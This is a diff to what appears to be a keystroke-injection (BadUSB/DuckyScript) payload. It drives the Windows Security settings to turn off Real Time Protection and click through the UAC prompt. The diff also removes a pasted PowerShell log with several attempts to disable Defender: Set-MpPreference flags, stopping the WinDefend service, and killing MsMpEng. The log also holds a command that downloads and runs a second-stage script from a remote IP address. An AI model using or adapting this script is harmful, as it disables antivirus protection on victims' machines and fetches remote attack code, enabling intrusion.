@@ -19,6 +19,8 @@ REM ── Step 3: Manage Settings ──
 TAB
 TAB
 TAB
+TAB
+TAB
 DELAY 300
 ENTER
 DELAY 1500
@@ -28,7 +30,6 @@ CTRL HOME
 DELAY 300
 
 REM ── Step 5: TAB once to land on Real Time Protection toggle ──
-TAB
 DELAY 500
 
 REM ── Step 6: Toggle off ──
@@ -38,78 +39,6 @@ DELAY 800
 REM ── Step 7: UAC Yes ──
 LEFT
 ENTER
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-PS C:\WINDOWS\system32> Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -MAPSReporting 0
-PS C:\WINDOWS\system32> Stop-Service WinDefend -Force
-At line:1 char:1
-+ Stop-Service WinDefend -Force
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus software.
-    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
-
-PS C:\WINDOWS\system32> Stop-Process -Name MsMpEng -Force
-Stop-Process : Cannot stop process "MsMpEng (5164)" because of the following error: Access is denied
-At line:1 char:1
-+ Stop-Process -Name MsMpEng -Force
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : CloseError: (System.Diagnostics.Process (MsMpEng):Process) [Stop-Process], ProcessComman
-   dException
-    + FullyQualifiedErrorId : CouldNotStopProcess,Microsoft.PowerShell.Commands.StopProcessCommand
-
-PS C:\WINDOWS\system32> IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
-IEX : At line:12 char:50
-+ $isAdmin = ([Security.Principal.WindowsPrincipal]
-+                                                  ~
-Missing closing ')' in expression.
-At line:13 char:6
-+     [Security.Principal.WindowsIdentity]::GetCurrent()
-+      ~
-Array index expression is missing or not valid.
-At line:13 char:6
-+     [Security.Principal.WindowsIdentity]::GetCurrent()
-+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Unexpected token 'Security.Principal.WindowsIdentity]::GetCurrent' in expression or statement.
-At line:13 char:54
-+     [Security.Principal.WindowsIdentity]::GetCurrent()
-+                                                      ~
-An expression was expected after '('.
-At line:14 char:1
-+ ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-+ ~
-Unexpected token ')' in expression or statement.
-At line:1 char:1
-+ IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/s ...
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
-    + FullyQualifiedErrorId : MissingEndParenthesisInExpression,Microsoft.PowerShell.Commands.InvokeExpressionCommand
 DELAY 2000
 
 REM ── Step 8: Close Windows Security ──
